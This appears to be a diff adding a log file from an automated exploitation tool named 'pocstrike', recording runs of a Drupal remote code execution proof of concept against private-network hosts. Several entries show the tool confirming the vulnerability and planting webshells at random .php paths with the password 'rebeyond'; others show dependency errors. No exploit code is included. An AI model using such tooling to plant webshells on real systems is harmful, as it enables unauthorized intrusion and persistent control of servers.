@@ -1,0 +1,43 @@
+[18:39:30] [INFO] loading PoC script 'C:\Users\cr0ss4ire\Desktop\漏洞自动化打击平台\pocstrike\pocs\_4_drupal_rce.py'
+[18:39:30] [INFO] pocstrike got a total of 1 tasks
+[18:39:30] [INFO] running poc:'Drupal remote command execute' target 'http://192.168.26.10:8083/'
+[18:39:31] [+] target : http://192.168.26.10:8083 has vulnerability
+[18:39:31] [+] vulkey : osMKnpvOgw
+[18:39:31] [INFO] Scan completed,ready to print
+[18:39:41] [INFO] loading PoC script 'C:\Users\cr0ss4ire\Desktop\漏洞自动化打击平台\pocstrike\pocs\_4_drupal_rce.py'
+[18:39:41] [INFO] pocstrike got a total of 1 tasks
+[18:39:41] [INFO] running poc:'Drupal remote command execute' target 'http://192.168.26.10:8083/'
+[18:39:41] [+] target : http://192.168.26.10:8083
+[18:39:41] [+] webshell : http://192.168.26.10:8083/40KpZ7EGwb.php
+[18:39:41] [+] pass : rebeyond
+[18:39:41] [INFO] Scan completed,ready to print
+[14:31:21] [INFO] loading PoC script 'C:\Users\cr0ss4ire\Desktop\spug-1.2.0\spug_api\pocstrike\pocs\_2_drupal_rce.py'
+[14:31:21] [INFO] PoC script "Drupal remote code execute" requires "beautifulsoup4==4.9.3:bs4" to be installed
+[14:31:21] [-] try install with "python -m pip install beautifulsoup4==4.9.3"
+[14:32:21] [INFO] loading PoC script 'C:\Users\cr0ss4ire\Desktop\spug-1.2.0\spug_api\pocstrike\pocs\_2_drupal_rce.py'
+[14:32:21] [ERROR] Poc: 'C:\Users\cr0ss4ire\Desktop\spug-1.2.0\spug_api\pocstrike\pocs\_2_drupal_rce.py' exec arise error: No module named 'bs4' 
+[14:32:21] [ERROR] PoC file "'_2_drupal_rce.py'" not found
+[14:32:21] [ERROR] no PoC loaded, please check your PoC file
+[14:34:23] [INFO] loading PoC script 'C:\Users\cr0ss4ire\Desktop\spug-1.2.0\spug_api\pocstrike\pocs\_2_drupal_rce.py'
+[14:34:23] [INFO] PoC script "Drupal remote code execute" requires "beautifulsoup4==4.9.3:bs4" to be installed
+[14:34:24] [INFO] pocstrike got a total of 1 tasks
+[14:34:24] [INFO] running poc:'Drupal remote code execute' target 'http://192.168.2.245:8080/'
+[14:34:24] [+] target : http://192.168.2.245:8080 has vulnerability
+[14:34:24] [+] vulkey : HFPEBfRr3J
+[14:34:24] [INFO] Scan completed,ready to print
+[14:38:35] [INFO] loading PoC script 'C:\Users\cr0ss4ire\Desktop\spug-1.2.0\spug_api\pocstrike\pocs\_2_drupal_rce.py'
+[14:38:35] [INFO] PoC script "Drupal remote code execute" requires "beautifulsoup4==4.9.3:bs4" to be installed
+[14:38:35] [INFO] pocstrike got a total of 1 tasks
+[14:38:35] [INFO] running poc:'Drupal remote code execute' target 'http://192.168.2.245:8080/'
+[14:38:35] [+] target : http://192.168.2.245:8080
+[14:38:35] [+] webshell : http://192.168.2.245:8080/95mBJ8Z3oa.php
+[14:38:35] [+] pass : rebeyond
+[14:38:35] [INFO] Scan completed,ready to print
+[14:50:32] [INFO] loading PoC script 'C:\Users\cr0ss4ire\Desktop\spug-1.2.0\spug_api\pocstrike\pocs\_2_drupal_rce.py'
+[14:50:32] [INFO] PoC script "Drupal remote code execute" requires "beautifulsoup4==4.9.3:bs4" to be installed
+[14:50:32] [INFO] pocstrike got a total of 1 tasks
+[14:50:32] [INFO] running poc:'Drupal remote code execute' target 'http://192.168.2.245:8080/'
+[14:50:32] [+] target : http://192.168.2.245:8080
+[14:50:32] [+] webshell : http://192.168.2.245:8080/Xil91qdVDj.php
+[14:50:32] [+] pass : rebeyond
+[14:50:32] [INFO] Scan completed,ready to print
